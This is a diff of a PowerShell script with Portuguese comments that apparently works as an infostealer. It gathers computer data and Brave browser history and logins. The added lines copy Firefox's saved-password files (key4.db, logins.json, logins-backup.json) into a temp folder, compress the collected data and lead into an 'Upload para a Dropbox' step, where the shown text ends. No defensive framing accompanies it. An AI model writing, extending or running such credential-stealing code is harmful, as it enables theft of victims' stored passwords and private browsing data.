@@ -474,14 +474,15 @@ $drivers
 
 "@
 
-$output > $env:TEMP\$FolderName/computerData.txt
+# Saída para o arquivo de texto de dados do computador
+$output > "$env:TEMP\$FolderName/computerData.txt"
 
 ############################################################################################################################################################
 # Dados do Browser
 function Get-BrowserData {
 
     [CmdletBinding()]
-    param (	
+    param (    
         [Parameter (Position=1,Mandatory = $True)]
         [string]$Browser,    
         [Parameter (Position=1,Mandatory = $True)]
@@ -513,6 +514,27 @@ function Get-BrowserData {
     } 
 }
 
+# Definindo o caminho da pasta do perfil do Firefox
+$FirefoxProfilePath = "C:\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release"
+
+# Definindo o caminho da pasta temporária
+$TempFolderPath = "$env:TEMP\$FolderName"
+
+# Verificando se a pasta temporária existe e, se não, criando-a
+if (-not (Test-Path $TempFolderPath)) {
+    New-Item -ItemType Directory -Path $TempFolderPath | Out-Null
+}
+
+# Lista dos arquivos que serão copiados
+$FilesToCopy = @("key4.db", "logins.json", "logins-backup.json")
+
+# Copiando os arquivos do Firefox para a pasta temporária
+foreach ($File in $FilesToCopy) {
+    $SourceFile = Join-Path -Path $FirefoxProfilePath -ChildPath $File
+    $DestinationFile = Join-Path -Path $TempFolderPath -ChildPath "Dados-do-Browser\$File"
+    Copy-Item -Path $SourceFile -Destination $DestinationFile -Force
+}
+
 # Criar uma pasta para os dados do navegador
 New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Dados-do-Browser" | Out-Null
 
@@ -527,7 +549,9 @@ Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$env:TMP\$Folde
 Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
 ############################################################################################################################################################
 
-Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
+# Comprimir a pasta temporária
+Compress-Archive -Path "$env:temp\$FolderName" -DestinationPath "$env:temp\$ZIP"
+
 
 # Upload para a Dropbox
 
